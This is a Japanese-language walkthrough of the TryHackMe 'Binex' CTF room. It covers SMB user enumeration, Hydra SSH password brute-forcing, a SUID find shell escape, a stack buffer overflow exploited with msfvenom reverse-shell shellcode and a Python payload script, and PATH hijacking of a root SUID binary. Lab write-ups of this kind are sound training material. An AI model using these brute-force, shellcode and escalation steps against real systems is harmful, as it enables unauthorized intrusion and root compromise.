# Binex CTF

https://tryhackme.com/room/binex

## Enumeration

```shell
TARGET=10.10.53.229
```

### ポートスキャン

```sh
$ rustscan -a $TARGET
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Where scanning meets swagging. 😎

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit
Open 10.10.53.229:22
Open 10.10.53.229:139
Open 10.10.53.229:445
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-18 16:58 JST
Initiating Ping Scan at 16:58
Scanning 10.10.53.229 [4 ports]
Completed Ping Scan at 16:58, 0.29s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:58
Completed Parallel DNS resolution of 1 host. at 16:58, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 16:58
Scanning 10.10.53.229 [3 ports]
Discovered open port 139/tcp on 10.10.53.229
Discovered open port 445/tcp on 10.10.53.229
Discovered open port 22/tcp on 10.10.53.229
Completed SYN Stealth Scan at 16:58, 0.30s elapsed (3 total ports)
Nmap scan report for 10.10.53.229
Host is up, received echo-reply ttl 61 (0.26s latency).
Scanned at 2025-06-18 16:58:51 JST for 0s

PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 61
139/tcp open  netbios-ssn  syn-ack ttl 61
445/tcp open  microsoft-ds syn-ack ttl 61

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.74 seconds
           Raw packets sent: 7 (284B) | Rcvd: 4 (160B)
```

SSH と SMB

### SMB

ユーザー名列挙

```sh
$ enum4linux -R 1000-1003 $TARGET

S-1-22-1-1000 Unix User\kel (Local User)
S-1-22-1-1001 Unix User\des (Local User)
S-1-22-1-1002 Unix User\tryhackme (Local User)
S-1-22-1-1003 Unix User\noentry (Local User)
```

ヒントから、tryhackme のパスワードが脆弱なはず。

### SSH Hydra

```sh
hydra -l tryhackme -P /usr/share/wordlists/rockyou.txt $TARGET ssh -t 30

[22][ssh] host: 10.10.53.229   login: tryhackme   password: [REDACTED]
```

## SUID :: Binary 1

問題文から、des ユーザーのフラグを読む必要がある。

find コマンドに、des ユーザーの SUID が付いている。

```sh
tryhackme@THM_exploit:~$ find / -perm -u=s -type f -ls 2>/dev/null
   262721    236 -rwsr-sr-x   1 des      des               238080 Nov  5  2017 /usr/bin/find
```

権限昇格

```sh
tryhackme@THM_exploit:~$ find . -exec /bin/sh -p \; -quit
$ id
uid=1002(tryhackme) gid=1002(tryhackme) euid=1001(des) egid=1001(des) groups=1001(des),1002(tryhackme)
```

des ユーザーのパスワードを教えてくれる親切設計。

```sh
$ cat /home/des/flag.txt
Good job on exploiting the SUID file. Never assign +s to any system executable files. Remember, Check gtfobins.

You flag is THM{.....................}

login crdential (In case you need it)
username: des
password: [REDACTED]
```

## Buffer Overflow :: Binary 2

次は、kel ユーザーのフラグが目標。

bof に kel の SUID が付いている。

```sh
des@THM_exploit:~$ ls -al
total 52
drwx------ 4 des  des  4096 Jan 17  2020 .
drwxr-xr-x 6 root root 4096 Jan 17  2020 ..
-rw------- 1 root root 1740 Jan 12  2020 .bash_history
-rw-r--r-- 1 des  des   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 des  des  3771 Apr  4  2018 .bashrc
-rwsr-xr-x 1 kel  kel  8600 Jan 17  2020 bof
-rw-r--r-- 1 root root  335 Jan 17  2020 bof64.c
drwx------ 2 des  des  4096 Jan 12  2020 .cache
-r-x------ 1 des  des   237 Jan 17  2020 flag.txt
drwx------ 3 des  des  4096 Jan 12  2020 .gnupg
-rw-r--r-- 1 des  des   807 Apr  4  2018 .profile
```

bof64.c

```c
#include <stdio.h>
#include <unistd.h>

int foo(){
        char buffer[600];
        int characters_read;
        printf("Enter some string:\n");
        characters_read = read(0, buffer, 1000);
        printf("You entered: %s", buffer);
        return 0;
}

void main(){
        setresuid(geteuid(), geteuid(), geteuid());
        setresgid(getegid(), getegid(), getegid());

        foo();
}
```

大きくバッファオーバーフローしている。

スタックが実行可能になっているので、オーバーフロー部分にシェルコードを上書きして実行させれば良いと思われる。ただし、pwn がインストールされていないため、どうやって実行するかという問題はある。

```sh
$ pwn checksec ./bof
[*] '/home/kali/ctf/binex/bof'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

メモリランダム化はされていない。固定アドレスで考えて OK。

```sh
des@THM_exploit:~$ cat /proc/sys/kernel/randomize_va_space
0
```

パターン生成

```sh
$ pwn cyclic 1000 > pattern
```

```sh
(gdb) r
Starting program: /home/des/bof
Enter some string:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj

Program received signal SIGSEGV, Segmentation fault.
0x000055555555484e in foo ()

(gdb) info registers
...
rsi            0x555555554956   93824992233814
rdi            0x7ffff7dd0760   140737351845728
rbp            0x6761616467616163       0x6761616467616163
rsp            0x7fffffffe498   0x7fffffffe498
...
```

RBP の 0x6761616467616163 ('caagdaag')は、パターンの 609 バイト目。RBP 8 バイトを考慮し、ret アドレスは、617 バイト目になる。

```sh
(gdb) x/320xb $rsp-700
0x7fffffffe1dc: 0xff    0x7f    0x00    0x00    0x12    0x00    0x00    0x00
0x7fffffffe1e4: 0x00    0x00    0x00    0x00    0x60    0x07    0xdd    0xf7
0x7fffffffe1ec: 0xff    0x7f    0x00    0x00    0x34    0x49    0x55    0x55
0x7fffffffe1f4: 0x55    0x55    0x00    0x00    0x62    0x4b    0xa6    0xf7
0x7fffffffe1fc: 0xff    0x7f    0x00    0x00    0xe8    0x90    0x9e    0xf7
0x7fffffffe204: 0xff    0x7f    0x00    0x00    0xe9    0x03    0x00    0x00
0x7fffffffe20c: 0x00    0x00    0x00    0x00    0x90    0xe4    0xff    0xff
0x7fffffffe214: 0xff    0x7f    0x00    0x00    0xe9    0x03    0x00    0x00
0x7fffffffe21c: 0x00    0x00    0x00    0x00    0x90    0xe5    0xff    0xff
0x7fffffffe224: 0xff    0x7f    0x00    0x00    0x48    0x48    0x55    0x55
0x7fffffffe22c: 0x55    0x55    0x00    0x00    0x61    0x61    0x61    0x61
0x7fffffffe234: 0x62    0x61    0x61    0x61    0x63    0x61    0x61    0x61
0x7fffffffe23c: 0x64    0x61    0x61    0x61    0x65    0x61    0x61    0x61
0x7fffffffe244: 0x66    0x61    0x61    0x61    0x67    0x61    0x61    0x61
0x7fffffffe24c: 0x68    0x61    0x61    0x61    0x69    0x61    0x61    0x61
```

パターンが始まるのは、0x7fffffffe230。nop ランディングを入れて、0x7fffffffe240 あたりに着地させれば良いと思う。

シェルコード生成。今回は標準入力から流し込むため、シェルを起動しても無反応になると思われるのでリバースシェルのシェルコードを生成。

```sh
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.13.85.243 LPORT=8888 -b '\x00' -f python
Warning: KRB5CCNAME environment variable not supported - unsetting
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 3 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 119 (iteration=0)
x64/xor chosen with final size 119
Payload size: 119 bytes
Final size of python file: 597 bytes
buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d"
buf += b"\x05\xef\xff\xff\xff\x48\xbb\x14\xd9\xbe\x7a\xe6"
buf += b"\x8c\x09\x15\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
buf += b"\xff\xe2\xf4\x7e\xf0\xe6\xe3\x8c\x8e\x56\x7f\x15"
buf += b"\x87\xb1\x7f\xae\x1b\x41\xac\x16\xd9\x9c\xc2\xec"
buf += b"\x81\x5c\xe6\x45\x91\x37\x9c\x8c\x9c\x53\x7f\x3e"
buf += b"\x81\xb1\x7f\x8c\x8f\x57\x5d\xeb\x17\xd4\x5b\xbe"
buf += b"\x83\x0c\x60\xe2\xb3\x85\x22\x7f\xc4\xb2\x3a\x76"
buf += b"\xb0\xd0\x55\x95\xe4\x09\x46\x5c\x50\x59\x28\xb1"
buf += b"\xc4\x80\xf3\x1b\xdc\xbe\x7a\xe6\x8c\x09\x15"
```

ペイロード生成スクリプト

0x7fffffffe240 へ ret させたら機能せず、もう少し先に ret する必要があった。バッファの後ろの方が書き込んだデータが壊れにくいためと思われる。

```python
buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d"
buf += b"\x05\xef\xff\xff\xff\x48\xbb\x14\xd9\xbe\x7a\xe6"
buf += b"\x8c\x09\x15\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
buf += b"\xff\xe2\xf4\x7e\xf0\xe6\xe3\x8c\x8e\x56\x7f\x15"
buf += b"\x87\xb1\x7f\xae\x1b\x41\xac\x16\xd9\x9c\xc2\xec"
buf += b"\x81\x5c\xe6\x45\x91\x37\x9c\x8c\x9c\x53\x7f\x3e"
buf += b"\x81\xb1\x7f\x8c\x8f\x57\x5d\xeb\x17\xd4\x5b\xbe"
buf += b"\x83\x0c\x60\xe2\xb3\x85\x22\x7f\xc4\xb2\x3a\x76"
buf += b"\xb0\xd0\x55\x95\xe4\x09\x46\x5c\x50\x59\x28\xb1"
buf += b"\xc4\x80\xf3\x1b\xdc\xbe\x7a\xe6\x8c\x09\x15"

# nop
payload = 300 * b"\x90"
# shellcode
payload += buf
# padding
payload += 'A' * (616 - len(buf) - 300)
# ret 0x7fffffffe2f8
payload += "\xf8\xe2\xff\xff\xff\x7f\x00\x00"

print(payload)
```

実行

```sh
python ./payload.py | ./bof
```

リバースシェル取得成功。

```sh
$ nc -nlvp 8888
listening on [any] 8888 ...
connect to [10.13.85.243] from (UNKNOWN) [10.10.230.33] 48660
id
uid=1000(kel) gid=1001(des) groups=1001(des)
```

```sh
cat flag.txt
You flag is THM{........................}

The user credential
username: kel
password: [REDACTED]
```

## PATH Manipulation :: Binary 3

exe に root SUID が付いている。

```sh
kel@THM_exploit:~$ ls -al
total 52
drwx------ 4 kel  kel  4096 Jan 17  2020 .
drwxr-xr-x 6 root root 4096 Jan 17  2020 ..
-rw------- 1 root root   16 Jan 12  2020 .bash_history
-rw-r--r-- 1 kel  kel   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 kel  kel  3771 Apr  4  2018 .bashrc
drwx------ 2 kel  kel  4096 Jan 12  2020 .cache
-rwsr-xr-x 1 root root 8392 Jan 17  2020 exe
-rw-r--r-- 1 root root   76 Jan 17  2020 exe.c
-rw------- 1 kel  kel   118 Jan 17  2020 flag.txt
drwx------ 3 kel  kel  4096 Jan 12  2020 .gnupg
-rw-r--r-- 1 kel  kel   807 Apr  4  2018 .profile
```

ごく初歩的な PATH 挿入問題。

```c
#include <unistd.h>

void main()
{
        setuid(0);
        setgid(0);
        system("ps");
}
```

エクスプロイト

```sh
kel@THM_exploit:~$ cp /bin/bash ./ps
kel@THM_exploit:~$ export PATH=/home/kel:$PATH
kel@THM_exploit:~$ ./exe
root@THM_exploit:~# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),1000(kel)
```

```sh
root@THM_exploit:~# cat /root/root.txt
The flag: THM{.........................}.
Also, thank you for your participation.

The room is built with love. DesKel out.
```

## 振り返り

- enum4linux の -R オプションは勉強になった。
- バッファオーバーフロー時の ret アドレスはバッファの後ろの方に設定しておかないと他の処理で壊されると、以前苦労して知見を得ていたはずなのに、すっかり忘れていてまた苦労した。
- バニラの gdb に久々に触ったので戸惑った。
